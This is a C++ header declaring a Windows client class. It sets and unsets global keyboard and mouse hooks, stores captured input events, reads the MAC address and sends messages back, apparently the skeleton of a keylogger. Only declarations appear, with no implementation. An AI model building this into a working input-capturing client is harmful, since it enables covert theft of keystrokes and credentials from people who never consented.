#pragma once
#include <windows.h>
#include <IPHlpApi.h>
#include <list>
#include <iostream>
#include "Event.h"
#pragma comment(lib, "IPHLPAPI.lib")

class Client
{
public:
	Client();
	~Client();
	void					setKeyboardHook(void);
	void					setMouseHook(void);
	void					unsetHook(HHOOK hook);
	void					unsetKeyboardHook(void);
	void					unsetMouseHook(void);
	void					sendBackMessage(void);
	void					getMACAddress(void);
private:
	HHOOK					m_keyboardHook;
	HHOOK					m_mouseHook;
	std::list<Event>		m_events;
};

LRESULT CALLBACK			KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
LRESULT CALLBACK			MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);